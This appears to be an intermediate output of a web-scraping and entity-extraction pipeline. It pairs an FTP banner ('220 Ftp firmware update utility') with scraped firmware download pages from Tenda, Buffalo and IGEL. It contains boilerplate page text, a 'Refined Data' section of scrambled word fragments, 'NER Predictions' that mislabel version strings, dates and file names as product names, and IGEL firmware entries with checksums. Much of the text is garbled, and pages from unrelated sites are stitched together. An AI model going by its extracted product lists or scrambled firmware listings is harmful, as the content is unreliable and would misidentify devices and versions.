V15.03.05.18_EN Firmware2017-08-10264AC10U Firmware V15.03.06.48_EN Firmware2018-04-09265AC10 Firmware V15.03.06.23_EN Firmware2018-01-19266AC10 Firmware V15.03.06.45_EN Firmware2018-10-12267A9 Firmware V12.01.01.23_EN Firmware2018-10-12268A9 Firmware V12.01.01.22_EN Firmware2016-11-25269A8 Firmware V5.07.54_EN Firmware2013-12-20270A6 Firmware V3.00.18_EN Firmware2012-11-19271A6 Firmware V3.0.20_EN Firmware2013-01-04272A5 Firmware V5.07.37_EN Firmware2012-12-05273A5 Firmware V5.07.26_EN Firmware2011-12-24274A5 Firmware V5.07.48_EN Firmware2013-05-11275A31 Firmware V5.07.54_EN Firmware2013-10-30276A302 Firmware V5.07.64_EN Firmware2013-11-27277A302 Firmware V5.07.66_EN Firmware2014-09-01278A301 Firmware V10.03.01.10_EN Firmware2016-10-24279A301 Firmware V15.13.08.12_EN Firmware2018-10-12280A301 Firmware V5.07.73_EN Firmware2018-02-25281A300 Firmware V5.07.73_EN Firmware2014-09-16282A300 Firmware V5.07.68_EN Firmware2014-04-17283A30 Firmware V5.07.15_EN Firmware2014-10-29284A30 Firmware V5.07.25_EN Firmware2012-11-19285A30 Firmware V5.07.27_EN Firmware2012-11-19286A30 Firmware V5.07.12_EN Firmware2013-04-09287A30 Firmware V5.07.11_EN Firmware2012-12-12288A3 Firmware V5.07.11_EN Firmware2012-12-12289A3 Firmware V5.07.28_EN Firmware2014-01-08290A3 Firmware V5.07.12_EN Firmware2013-04-17291A18 Firmware V15.13.07.13_EN Firmware2018-05-08292A15 Firmware V15.13.07.13_EN Firmware2018-05-082933G622R+ Firmware H2_V3.5.1h_EN Firmware2014-01-22For HomeMeshRouterSwitchPowerlineSmart HomeAdapterBroadband CPE3G/4GExtenderIP CameraFor BusinessWirelessSwitchCabling SystemServiceOnline serviceForumSimulatorDownloadFAQPrivacy PolicyPartnersProfileProfileContact UsNewsVideoPartnersDistributorResellerRetailerContact Ussupport@tenda.cn +86 755-2765 7180All rights reserved
+©  2015-2018  Shenzhen Tenda Technology Co.,Ltd. +86 755-2765 7180Online serviceOur site uses cookies. Tenda uses cookies to improve site functionality, provide you with a better browsing experience, and to enable our partners to advertise to you. Detailed information on the use of cookies on this Site, is provided in our cookie policy. By using this Site or clicking on ‘OK’, you consent to the use of cookies.OK
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.tendacn.com/en/service/download-cata-11.html===============================
+
+ 4gextenderip camerafor businesswirelessswitchcabling systemserviceonline serviceforumsimulatordownloadfaqprivacy policypartnersprofileprofilecontact usnewsvideopartnersdistributorresellerretailercontact ussupport 4gextenderip camerafor businesswirelessswitchcabling systemsupportpartnersabout usprofilecontact usnewsvideoworldwidefirmwaretenda firmware download 4gextenderip camerawirelessswitchcabling systemonline servicedownloadfaqsimulatorfor homemeshrouterswitchpowerlinesmart homeadapterbroadband cpe3g 2018 shenzhen tenda technology co ., ltd better networking worldwidefor homefor businessservicepartnersprofilemeshrouterswitchpowerlinesmart homeadapterbroadband cpe3g 2765 7180all rights reserved © 2015 2765 7180online serviceour site uses cookies 22for homemeshrouterswitchpowerlinesmart homeadapterbroadband cpe3g 0 ） firmware v1 2095teg3224p firmware v102r001_en firmware2014 1796teg3210p firmware v102r004 firmware2014 0 ） firmware v2 13167g300 firmware v100r003 firmware2013 0 firmware v102r001 firmware2014 0 system firmware firmware2015 0 system firmware firmware2016 tenda uses cookies better browsing experience improve site functionality 0 firmware v50 0 firmware v15 0 firmware v12 0 firmware v11 0 firmware v10 0 firmware v1 30194f9 firmware v12 2984w15e firmware v15 29260ac15 firmware v15 29255ac5 firmware v15 28258ac15 firmware v15 24279a301 firmware v15 24263ac15 firmware v15 24237d1201 firmware v9 24223d305 firmware v50 24206f3 firmware v12 22208f3 firmware v12 21261ac15 firmware v15 20209f3 firmware v11 20143n301 firmware v12 19266ac10 firmware v15 19210f3 firmware v11 19178fh456 firmware v12 19142n301 firmware v12 18216dh301 firmware v10 17291a18 firmware v15 17195f9 firmware v12 17192f9 firmware v12 17170g3 firmware v15 17141n301 firmware v11 16203f300 firmware v12 15262ac15 firmware v15 1397teg3210p firmware v60 13259ac15 firmware v15 12268a9 firmware v12 12267a9 firmware v12 12215dh301 firmware v10 12193f9 firmware v12 12144n301 firmware v12 10264ac10u firmware v15 10145n301 firmware v12 09265ac10 firmware v15 09257ac18 firmware v15 08292a15 firmware v15 08256ac18 firmware v15 05205f300 firmware v12 05169g3 firmware v15 04207f3 firmware v12 0193v300 firmware v53 01278a301 firmware v10 us firmware v1 nametypedatefile01wh450a firmware v1 3029w312a firmware v1 30186fh1206 firmware v1 29241ap5 firmware v1 2915w568r firmware v1 2792w1500a firmware v1 2728w312a firmware v1 2710w6 firmware v1 2663w301a firmware v1 26217d830r firmware v1 26187fh1202 firmware v1 2591w1500a firmware v1 25240ap5 firmware v1 2507w9 firmware v1 24218d830r firmware v1 23116o6 firmware v1 23112p200 firmware v1 2290w1500a firmware v1 2264w301a firmware v1 22235d151 firmware v1 20229d301 firmware v1 20198f452 firmware v1 19245ap4 firmware v1 19244ap4 firmware v1 19243ap4 firmware v1 19242ap5 firmware v1 19190fh1201 firmware v1 19161i6 firmware v1 19157m3 firmware v1 1913w568r firmware v1 19137n6 firmware v1 19132n80 firmware v1 18236d151 firmware v1 18231d301 firmware v1 17212f1200 firmware v1 17189fh1202 firmware v1 17172g103 firmware v1 17163i12 firmware v1 17159i6 firmware v1 17154m3 firmware v1 17118o6 firmware v1 17117o6 firmware v1 16211f1201 firmware v1 16158i9 firmware v1 15196f456 firmware v1 15171g103 firmware v1 15129o1 firmware v1 14131n80 firmware v1 13164i12 firmware v1 13160i6 firmware v1 13155m3 firmware v1 13127o3 firmware v1 13126o3 firmware v1 13125o3 firmware v1 13124o3 firmware v1 13121o6 firmware v1 1299pw201a firmware v1 12230d301 firmware v1 12191fh1201 firmware v1 12120o6 firmware v1 1211w6 firmware v1 1114w568r firmware v1 11133n80 firmware v1 1089w1500a firmware v1 10156m3 firmware v1 1012w6 firmware v1 1006w900a firmware v1 1004wh302a firmware v1 09254ac500 firmware v1 08197f456 firmware v1 08165i12 firmware v1 08162i21 firmware v1 08136n60 firmware v1 08119o6 firmware v1 08106pa6 firmware v1 08105pa6 firmware v1 07222d820r firmware v1 07221d820r firmware v1 06188fh1202 firmware v1 0519w330a firmware v1 0481w1800r firmware v1 04214e101 firmware v1 04128o1 firmware v1 04104pa7 firmware v1 04101pw201a firmware v1 04100pw201a firmware v1 0288w1500a firmware v1 01199f452 firmware v1 3072w3002r firmware v5 30276a302 firmware v5 2960w303r firmware v5 29284a30 firmware v5 29246ah302 firmware v5 29202f300 firmware v5 29185fh303 firmware v5 2855w308r firmware v5 2852w308r firmware v5 2851w308r firmware v5 2758w308r firmware v5 2745w311r firmware v5 27277a302 firmware v5 2654w308r firmware v5 2650w309r firmware v5 2624w316r firmware v5 26184fh303 firmware v5 26150n3 firmware v5 25281a300 firmware v5 25269a8 firmware v5 2520w316r firmware v5 25146n301 firmware v5 24274a5 firmware v5 2341w311r firmware v5 21201f303 firmware v5 21147n30 firmware v5 19286a30 firmware v5 19285a30 firmware v5 19247ah302 firmware v5 1916w368r firmware v5 19149n3 firmware v5 17283a30 firmware v5 17200f303 firmware v5 17183fh304 firmware v5 16282a300 firmware v5 1456w308r firmware v5 1446w309r firmware v5 1423w316r firmware v5 1371w3002r firmware v5 12289a3 firmware v5 12288a3 firmware v5 12280a301 firmware v5 12224d303 firmware v5 12204f300 firmware v5 12182fh305 firmware v5 11275a31 firmware v5 1078w268r firmware v5 1043w311r firmware v5 1042w311r firmware v5 10151n3 firmware v5 09287a30 firmware v5 08290a3 firmware v5 08152n3 firmware v5 0753w308r firmware v5 0744w311r firmware v5 0727w316r firmware v5 0726w316r firmware v5 0677w268r firmware v5 0648w309r firmware v5 0539w311r firmware v5 05273a5 firmware v5 0522w316r firmware v5 0521w316r firmware v5 0470w3002r firmware v5 04272a5 firmware v5 04181fh307 firmware v5 0359w308r firmware v5 0257w308r firmware v5 0249w309r firmware v5 0225w316r firmware v5 02225d303 firmware v5 0173w3002r firmware v5 0161w303r firmware v5 0147w309r firmware v5 01153n150 firmware v5 01148n30 firmware v5 01140n4 firmware v5 29134n60 firmware v2 2805w900a firmware v2 2680w1801r firmware v2 26226d302 firmware v2 24232d152 firmware v2 23111p200 firmware v2 1882w1800r firmware v2 1802wh450a firmware v2 1730w312a firmware v2 1598pw201a firmware v2 1583w1800r firmware v2 15233d152 firmware v2 12138n6 firmware v2 11227d302 firmware v2 11135n60 firmware v2 1079w1801r firmware v2 1003wh302a firmware v2 08139n6 firmware v2 08110p200 firmware v2 0269w300a firmware v2 17213e101 （ v2 2862w301a firmware v3 2318w330r firmware v3 23114p1001p firmware v3 20270a6 firmware v3 19271a6 firmware v3 19102ph3 firmware v3 1217w330r firmware v3 09220d820r firmware v3 07219d830r firmware v3 0676w268r firmware v3 06113p1002 firmware v3 0540w311r firmware v3 04103ph3 firmware v3 03115p1000 firmware v3 08109p3 firmware 3 08108p6 firmware 3 0675w268r firmware h3_v3 0574w268r firmware h1_v3 04107p6 firmware 3 ‘ ok ’, 28_hong kong firmware2012 15 _en firmware2011 firmware v1 firmware v5 firmware v3 firmware h3_v3 firmware h1_v3 firmware h2_v3 1294teg3224p v1 25177fh456 v2 18239c50s v2 11234d151 v2 14180fh330 v3 _en firmware2014 _en firmware2015 _en firmware2016 en firmware2014 8_en firmware2014 73_en firmware2014 71_en firmware2014 6_en firmware2014 68_en firmware2014 66_en firmware2014 64_en firmware2014 5_en firmware2014 58_en firmware2014 53_en firmware2014 4_en firmware2014 47_en firmware2014 46_en firmware2014 3_en firmware2014 28_en firmware2014 27_en firmware2014 25_en firmware2014 23_en firmware2014 20_en firmware2014 1h_en firmware2014 1_en firmware2014 18_en firmware2014 17_en firmware2014 15_en firmware2014 14_en firmware2014 11_en firmware2014 _en firmware2019 _en firmware2018 8_us firmware2015 8_en firmware2015 7_en firmware2015 6c_us firmware2015 6c_eu firmware2015 6_en firmware2015 49_en firmware2015 3_en firmware2015 30_en firmware2015 2_en firmware2015 1_en firmware2015 16_en firmware2015 10_en firmware2015 06_en firmware2015 6_en firmware2013 65_en firmware2013 64_en firmware2013 5_en firmware2013 58_en firmware2013 54_en firmware2013 51_en firmware2013 49_en firmware2013 48_en firmware2013 47_en firmware2013 46_en firmware2013 42_en firmware2013 37_en firmware2013 2_en firmware2013 22_en firmware2013 20_en firmware2013 1_en firmware2013 17_en firmware2013 13_en firmware2013 0_en firmware2013 _en firmware2017 en firmware2016 6_en firmware2016 68_en firmware2016 54_en firmware2016 53_en firmware2016 3_en firmware2016 2_en firmware2016 23_en firmware2016 22_en firmware2016 20_en firmware2016 1_en firmware2016 19_en firmware2016 17_en firmware2016 13_en firmware2016 10_en firmware2016 07_en firmware2016 04_en firmware2016 korea version en firmware2018 detailed information cookie policy 8_en firmware2012 86 755 7_en firmware2012 73_en firmware2018 6h_en firmware2011 6d_en firmware2011 6_en firmware2018 64_en firmware2018 5_en firmware2012 50_en firmware2018 4j_en firmware2011 4_us firmware2018 4_en firmware2018 48_multi firmware2018 48_en firmware2018 47_en firmware2018 45_multi firmware2019 45_en firmware2018 43_en firmware2018 42_en firmware2018 42_en firmware2012 41_multi_en firmware2018 41_multi firmware2018 3_en firmware2018 38_en firmware2018 37_en firmware2012 33_en firmware2012 32_en firmware2012 2_en firmware2018 28_hongkong firmware2012 28_en firmware2018 27_en firmware2012 26_en firmware2012 26_en firmware2011 25_en firmware2012 25_en firmware2011 25238c50s v4 23_en firmware2018 21_en firmware2018 201f_en firmware2012 201d_en firmware2011 1_en firmware2012 1_en firmware2011 18_en firmware2012 16_multi_tru firmware2018 16_en firmware2012 15_en firmware2011 15_en firmware2009 13_en firmware2018 11_en firmware2012 10_en firmware2012 0_en firmware2011 08_en firmware2011 03_en firmware2011 02s_en firmware2011 01_en firmware2012 8_en firmware2017 5_en firmware2017 4_us firmware2017 42_en firmware2017 36_en firmware2017 30_multi_en firmware2017 2_eu firmware2017 2_en_us firmware2017 2_en_eu firmware2017 2_en firmware2017 28_en firmware2017 18_en firmware2017 16_multi firmware2017 14_en firmware2017 11_en firmware2017 05_en firmware2017 12_en firmware2015 12_en firmware2013 12_en firmware2018 tenda 67_en firmware2014 8 firmware2015 09_en firmware2016 2015 site cookies 0 firmware v5 v2 v3 3 firmware2014 firmware2016 ok firmware2012 firmware2011 15 firmware2017 12_en 8 67_en 09_en v6 using use provided provide partners hongkong enable consent cn clicking austrilia advertise 9 8155 8097 7663 7 6 511 5017 5 4977 4856 4767 4758 4754 4741 4730 4180 4122 4100 408 4051 4 3920 3916 3899 3880 3862 3857 3856 3827 3805 353 2965w300d 2931w311r 2848_755 28251ac9v1 2709w6 2478 24168g3 2338w311r 2337w311r 2336w311r 2224 22 2187w150d 2168w300d 2120 21 2089 2084 20 2 1_cn 1985w150d 19166g3v3 19 1736 17173fh456v4 17123o3v2 1641 16249ac9v1 16 15228d301v2 15179fh330 1508w6 14250ac9v1 1418 14 1330 13130nh326 13122o3v2 13 12253ac6v1 1217 12 1171 11 1068_1567_841 1035w311r 1034w311r 10 1 09252ac6v2 09174fh456v2 09 082933g622r 08 0733w311r 07 0686w150d 0667w300d 06 0532w311r 05 04 03176fh456v1 03175fh456v1 03 0266w300d 02 01248ac9v1 01 00
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": [
+    "cata-11.html",
+    "cpe3g",
+    "v1",
+    "teg3224p",
+    "v102r001",
+    "firmware2014",
+    "teg3210p",
+    "v102r004",
+    "v2",
+    "g300",
+    "v100r003",
+    "firmware2013",
+    "v102r001",
+    "firmware2015",
+    "firmware2016",
+    "v50",
+    "v15",
+    "v12",
+    "v11",
+    "v10",
+    "f9",
+    "w15e",
+    "ac15",
+    "ac5",
+    "ac15",
+    "a301",
+    "ac15",
+    "d1201",
+    "v9",
+    "d305",
+    "f3",
+    "f3",
+    "ac15",
+    "f3",
+    "n301",
+    "ac10",
+    "f3",
+    "fh456",
+    "n301",
+    "dh301",
+    "a18",
+    "f9",
+    "f9",
+    "g3",
+    "n301",
+    "f300",
+    "ac15",
+    "teg3210p",
+    "v60",
+    "ac15",
+    "a9",
+    "a9",
+    "dh301",
+    "f9",
+    "n301",
+    "ac10u",
+    "n301",
+    "ac10",
+    "ac18",
+    "a15",
+    "ac18",
+    "f300",
+    "g3",
+    "f3",
+    "v300",
+    "v53",
+    "a301",
+    "nametypedatefile01wh450a",
+    "w312a",
+    "fh1206",
+    "ap5",
+    "w568r",
+    "w1500a",
+    "w312a",
+    "w6",
+    "w301a",
+    "d830r",
+    "fh1202",
+    "w1500a",
+    "ap5",
+    "w9",
+    "d830r",
+    "o6",
+    "p200",
+    "w1500a",
+    "w301a",
+    "d151",
+    "d301",
+    "f452",
+    "ap4",
+    "ap4",
+    "ap4",
+    "ap5",
+    "fh1201",
+    "i6",
+    "m3",
+    "w568r",
+    "n6",
+    "n80",
+    "d151",
+    "d301",
+    "f1200",
+    "fh1202",
+    "g103",
+    "i12",
+    "i6",
+    "m3",
+    "o6",
+    "o6",
+    "f1201",
+    "i9",
+    "f456",
+    "g103",
+    "o1",
+    "n80",
+    "i12",
+    "i6",
+    "m3",
+    "o3",
+    "o3",
+    "o3",
+    "o3",
+    "o6",
+    "pw201a",
+    "d301",
+    "fh1201",
+    "o6",
+    "w6",
+    "w568r",
+    "n80",
+    "w1500a",
+    "m3",
+    "w6",
+    "w900a",
+    "wh302a",
+    "ac500",
+    "f456",
+    "i12",
+    "i21",
+    "n60",
+    "o6",
+    "pa6",
+    "pa6",
+    "d820r",
+    "d820r",
+    "fh1202",
+    "w330a",
+    "w1800r",
+    "e101",
+    "o1",
+    "pa7",
+    "pw201a",
+    "pw201a",
+    "w1500a",
+    "f452",
+    "w3002r",
+    "v5",
+    "a302",
+    "w303r",
+    "a30",
+    "ah302",
+    "f300",
+    "fh303",
+    "w308r",
+    "w308r",
+    "w308r",
+    "w308r",
+    "w311r",
+    "a302",
+    "w308r",
+    "w309r",
+    "w316r",
+    "fh303",
+    "n3",
+    "a300",
+    "a8",
+    "w316r",
+    "n301",
+    "a5",
+    "w311r",
+    "f303",
+    "n30",
+    "a30",
+    "a30",
+    "ah302",
+    "w368r",
+    "n3",
+    "a30",
+    "f303",
+    "fh304",
+    "a300",
+    "w308r",
+    "w309r",
+    "w316r",
+    "w3002r",
+    "a3",
+    "a3",
+    "a301",
+    "d303",
+    "f300",
+    "fh305",
+    "a31",
+    "w268r",
+    "w311r",
+    "w311r",
+    "n3",
+    "a30",
+    "a3",
+    "n3",
+    "w308r",
+    "w311r",
+    "w316r",
+    "w316r",
+    "w268r",
+    "w309r",
+    "w311r",
+    "a5",
+    "w316r",
+    "w316r",
+    "w3002r",
+    "a5",
+    "fh307",
+    "w308r",
+    "w308r",
+    "w309r",
+    "w316r",
+    "d303",
+    "w3002r",
+    "w303r",
+    "w309r",
+    "n150",
+    "n30",
+    "n4",
+    "n60",
+    "w900a",
+    "w1801r",
+    "d302",
+    "d152",
+    "p200",
+    "w1800r",
+    "wh450a",
+    "w312a",
+    "pw201a",
+    "w1800r",
+    "d152",
+    "n6",
+    "d302",
+    "n60",
+    "w1801r",
+    "wh302a",
+    "n6",
+    "p200",
+    "w300a",
+    "e101",
+    "w301a",
+    "v3",
+    "w330r",
+    "p1001p",
+    "a6",
+    "a6",
+    "ph3",
+    "w330r",
+    "d820r",
+    "d830r",
+    "w268r",
+    "p1002",
+    "w311r",
+    "ph3",
+    "p1000",
+    "p3",
+    "p6",
+    "w268r",
+    "h3",
+    "v3",
+    "w268r",
+    "h1",
+    "v3",
+    "p6",
+    "firmware2012",
+    "firmware2011",
+    "h2",
+    "v3",
+    "teg3224p",
+    "fh456",
+    "c50s",
+    "d151",
+    "fh330",
+    "firmware2019",
+    "firmware2018",
+    "firmware2017",
+    "c50s",
+    "v4",
+    "firmware2009",
+    "v6",
+    "w300d",
+    "w311r",
+    "ac9v1",
+    "w6",
+    "g3",
+    "w311r",
+    "w311r",
+    "w311r",
+    "w150d",
+    "w300d",
+    "w150d",
+    "g3v3",
+    "fh456v4",
+    "o3v2",
+    "ac9v1",
+    "d301v2",
+    "fh330",
+    "w6",
+    "ac9v1",
+    "nh326",
+    "o3v2",
+    "ac6v1",
+    "w311r",
+    "w311r",
+    "ac6v2",
+    "fh456v2",
+    "g622r",
+    "w311r",
+    "w150d",
+    "w300d",
+    "w311r",
+    "fh456v1",
+    "fh456v1",
+    "w300d",
+    "ac9v1"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.buffalo-technology.com/service-support/downloads/===============================
+
+Downloads - Buffalo Technology
+Service & SupportDownloads
+EN DE FR ES IT
+About Buffalo
+Partner
+Buy
+Contact
+Products
+NAS Systems
+Other Storage Systems
+Network Components
+Product Series
+Technology & Solutions
+Technology solutions
+Why populated NAS?
+Buffalo Windows Storage Server
+Explanation of NAS & RAID
+Buffalo TeraStation NAS for iSCSI Expansion
+Cloud Solutions
+Software
+WebAccess
+Network QuickView by Buffalo
+NovaStor NovaBACKUP®
+Trend Micro NAS Security Antivirus
+Secure LockWare™
+Security
+TeraStation™: the securest NAS on the market
+General Data Protection Regulation
+Replication & Failover
+Data Recovery
+Case Studies & White Paper
+Service & Support
+FAQs
+Downloads
+Support
+Warranty and VIP Service
+Partner Program
+Media
+Contact
+DownloadsSoftware, firmware and updates
+Here you will find the latest updates for your product. In addition to current software and firmware, you will also find operating instructions and utilities.
+show all DownloadsDeclaration of Conformity
+here you will find our EU Declaration of Conformity documents.
+DoC documentsTechnical Documentation – ErP
+Here you will find the technical documentation of our products according to EU Commission regulations.
+ErP documents
+Product Finder
+Products
+NAS Systems
+Other Storage Solutions
+Network Components
+Product Series
+Technology & Solutions
+Technology solutions
+Security
+Software
+Case Studies & White Paper
+Service & Support
+FAQs
+Downloads
+Contact
+Support
+Warranty and VIP Service
+About Buffalo
+Career
+Press
+Dates & Events
+Partner Program
+EN DE FR ES IT
+Terms and conditions
+Privacy policy
+Imprint
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.buffalo-technology.com/service-support/downloads/===============================
+
+ buffalo novastor novabackup ® trend micro nas security antivirus secure lockware ™ security terastation ™: iscsi expansion cloud solutions software webaccess network quickview solutions technology solutions security software case studies storage systems network components product series technology events partner program en de fr es buffalo partner buy contact products nas systems storage solutions network components product series technology vip service partner program media contact downloadssoftware erp documents product finder products nas systems market general data protection regulation replication support faqs downloads contact support warranty supportdownloads en de fr es buffalo windows storage server explanation failover data recovery case studies support faqs downloads support warranty raid buffalo terastation nas doc documentstechnical documentation – erp buffalo career press dates solutions technology solutions conditions privacy policy imprint buffalo technology service also find operating instructions white paper service eu commission regulations vip service current software securest nas populated nas products according conformity documents technical documentation product nas eu declaration downloads latest updates find updates conformity utilities terms show firmware downloadsdeclaration addition
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": []
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.igel.com/software-downloads/igel-universal-desktop-firmware/===============================
+
+IGEL UNIVERSAL DESKTOP FIRMWARE - IGEL
+MENUMENUCOMPANYRESOURCESCAREERSBLOGCOMMUNITYCONTACTENGLISH
+DEUTSCH
+MENUMENUDOWNLOADFREE HARDWAREWHY IGEL
+Who Needs ItWhy Revolutionary?ROI CalculatorHow We CompareOur Powerful Partnerships
+PRODUCTS
+IGEL Workspace Edition
+IGEL OSUniversal Management Suite
+Enterprise Management Pack
+Enterprise Management Pack Overview
+HARDWARE
+EndpointsIGEL Certified Hardware
+Product Support
+Product Support Overview
+Devices we support Acer, Advantech
+Advantech-DLoG, Dell/ Wyse, Fujitsu, HP, Intel, Lenovo, LG, Onyx Healthcare, Secunet, Stone, Toshiba
+SOLUTIONS
+FOR YOUR APPLICATIONS
+End User ComputingUnified CommunicationAuthenticationUSB ManagementDictationSignaturePrintingSecure TunnelingTerminal Emulation
+FOR YOUR VIRTUALIZATION PROJECT STAGE
+Considering VirtualizationProof of ConceptDoing PilotDeployScaling Up
+FOR YOUR INDUSTRY
+EducationServices: Financial, Insurance & LegalHealthcareGovernmentRetailManufacturing & LogisticsUtilitiesOther
+CUSTOMERSSUPPORTPARTNERS
+SOLUTION PROVIDERS
+Find a Solution Provider Near YouBecome a Solution ProviderPartner Program OverviewRegister a DealPartner Resources
+STRATEGIC PARTNERS
+Technology PartnersIGEL Certified HardwareManaged Service Providers and Systems Integrators
+DISTRIBUTORS
+Find a Distributor
+PARTNER FORMS
+Download 3 LicensesFree Hardware
+EVENTSCOMPANYRESOURCESCAREERSCONTACTBLOGCOMMUNITYFREE HARDWAREDOWNLOAD
+Software Downloads
+SOFTWARE/IGEL UNIVERSAL DESKTOP FIRMWARE/
+LX
+V5
+lx_5.13.110_public.zip2018/07/03MD5: 9d82ab53deff37358660048aa3e66d5fSHA-256: 3d638fcce2b02daa7e43c616a84b1e8f6e6a2dce89855474ce6772b0595d45d2Firmware update for original IGEL devices IGEL Linux v5.13.110 (.zip)Detailed DescriptionImportant information for IZ users:
+As IZ devices are not included in the maintenance cycle after EOL of the device, 5.13.110 is the last available firmware update for the IZ3 (M340C, Device ID: IZ3-xxx50) and also for the IZ2 (D220, Device ID: IZ2-xxx 40). The Device ID can be checked in the “About” window, which is available in the IGEL Start Menu. Alternatively you can buy the IZ->UD Upgrade package to convert the device to an Universal Desktop device with software maintenance after EOL.
+lx_5.12.220_public.zip2018/05/16MD5: 5faa48e36ff4d74b18bbbf781fde5991SHA-256: ed141f06cccf7f948a3fb743fc9a97de8a1974be4f6bb31148ce8d84825f8795Firmware update for original IGEL devices IGEL Linux v5.12.220 (.zip) - Security Fix for RDP – CredSSPDetailed Descriptionlx_5.12.100_public.zip2017/10/20MD5: 77cd150db337b070db0d85450ee2f2ebSHA-256: 2e077b6760d57c3f9b3e080ad024ffbad0900c93f0d3c92e955e2707406cf9f6Firmware update for original IGEL devices IGEL Linux v5.12.100 (.zip) - important Update: Security Fixes for KRACK Attacks includedDetailed DescriptionSAMSUNG Endpoints:
+———————
+This firmware enables IGEL LX v5-based Samsung endpoint to migrate to the new IGEL OS 10 with full feature set. A Samsung IGEL OS 10 Upgrade License is needed to perform the upgrade. Please get in contact with your Sales Representative or with IGEL directly for further information. Please be aware that once the device is upgraded to IGEL OS 10, there is no downgrade to IGEL Linux v5 – Samsung edition.
+Therefore, please test the required functions before rolling IGEL OS 10 out to your entire environment.
+IGEL LX Endpoints:
+———————
+With this firmware, it is now possible to migrate your IGEL endpoints to the new IGEL Linux 10 at no additional charge. Please be aware that once the device is upgraded to IGEL LX 10, there is no downgrade to IGEL Linux v5. Existing Custom Partitions based on Linux v5 will no longer function.
+Please test the required functions before rolling IGEL Linux 10 out to your entire environment.
+lx_5.12.100_CA-certificates.txt2017/10/20List of CA-certificates included in
+IGEL Linux v5.12.100 (.txt)lx_5.11.400_public.zip2017/08/30MD5: 55ff0209406b432a0111f264b8ee357bSHA-256: 48399ef8644ec16673bb14c938023214ee2ecdeac2ca4ee5807f3e3b05ad4b94Firmware update for original IGEL devices IGEL Linux v5.11.400 (.zip) Detailed DescriptionSAMSUNG Endpoints:
+———————
+This firmware enables IGEL LX v5-based Samsung endpoint to migrate to the new IGEL OS 10 with full feature set. A Samsung IGEL OS 10 Upgrade License is needed to perform the upgrade. Please get in contact with your Sales Representative or with IGEL directly for further information. Please be aware that once the device is upgraded to IGEL OS 10, there is no downgrade to IGEL Linux v5 – Samsung edition.
+Therefore, please test the required functions before rolling IGEL OS 10 out to your entire environment.
+IGEL LX Endpoints:
+———————
+With this firmware, it is now possible to migrate your IGEL endpoints to the new IGEL Linux 10 at no additional charge. Please be aware that once the device is upgraded to IGEL LX 10, there is no downgrade to IGEL Linux v5. Existing Custom Partitions based on Linux v5 will no longer function.
+Please test the required functions before rolling IGEL Linux 10 out to your entire environment.
+lx_5.11.400_CA-certificates.txt2017/08/30List of CA-certificates included in
+IGEL Linux v5.11.400 (.txt)lx_5.11.290_public.zip2017/07/12MD5: bffb78d85c03287c9c1063b84965414aSHA-256: 4c0bd2fb034f68c45cb906c98929f2e4680a92a3c0a5dc20fa97dab06ea5b54cFirmware update for original IGEL devices IGEL Linux v5.11.290 (.zip) Detailed Descriptionlx_5.11.200_public.zip2017/04/18MD5: 0d82c8c80c27cc249478e0bc20be748fSHA-256: 0d016dfbee822ae81d0113a04d916666fdd84da9225ba1f902bfbef75750eb8cFirmware update for original IGEL devices IGEL Linux v5.11.200 (.zip) Detailed DescriptionWith this firmware, it is possible to migrate your IGEL endpoints to the new IGEL Linux 10 at no additional charge. Please be aware that once the device is upgraded to IGEL LX 10, there is no downgrade to IGEL Linux v5. Existing Custom Partitions based on Linux v5 will no longer function.
+Please test the required functions before rolling IGEL Linux 10 out to your entire environment.
+lx_5.11.100_public.zip2017/03/03MD5: 293a032f5c7487b69a773405180d1f7cSHA-256: 80e18605ad76ef1f9d2643c126e2e646419f9dc64bbdbe650a9bf7dedf66d0d5Firmware update for original IGEL devices IGEL Linux v5.11.100 (.zip) Detailed DescriptionWith this firmware, it is now possible to migrate your IGEL endpoints to the new IGEL Linux 10 at no additional charge. Please be aware that once the device is upgraded to IGEL LX 10, there is no downgrade to IGEL Linux v5. Existing Custom Partitions based on Linux v5 will no longer function.
+Please test the required functions before rolling IGEL Linux 10 out to your entire environment.
+lx_5.10.410_public.zip2016/11/02MD5: 906c9700fd5236122ea01aa512b47837SHA-256: 35900f9a9495e061068eba210a1a2b7fd498d1c158c83ca6eb994ac470640020Firmware update for original IGEL devices IGEL Linux v5.10.410 (.zip) Detailed Descriptionlx_5.10.240_public.zip2016/09/12MD5: 34f8b8ea130e17bf76464b7075fe6372SHA-256: c4ea664932108a7d254a194457a2add0f30adc8a4aaefdaed74b74aa9beb16adFirmware update for original IGEL devices IGEL Linux v5.10.240 (.zip) Detailed Descriptionlx_5.10.100_public.zip2016/06/07MD5: 47e2c97a5f634b384f94fd0721a07720SHA-256: 72b3f5ab9a7a4e3989e4e138ebb3403aacb63d51556e575e3463cc453b26e016Firmware update for original IGEL devices IGEL Linux v5.10.100 (.zip) Detailed Descriptionlx_5.10.100_CA-certificates.txt2016/06/07List of CA-certificates included in IGEL Linux v5.10.100 (.txt)lx_5.09.100_public.zip2016/03/16MD5: bf098a9c2a574afb9812bd42cf2e6fdcSHA-256: f72805c28d18ac89067c286e1ed78ceba99c6df49c024dad55ff631ad2e6f424Firmware update for original IGEL devices IGEL Linux v5.09.100 (.zip) Detailed DescriptionImportant information for Lync / Skype for Business with Citrix HDX RTME and IZ2 users:
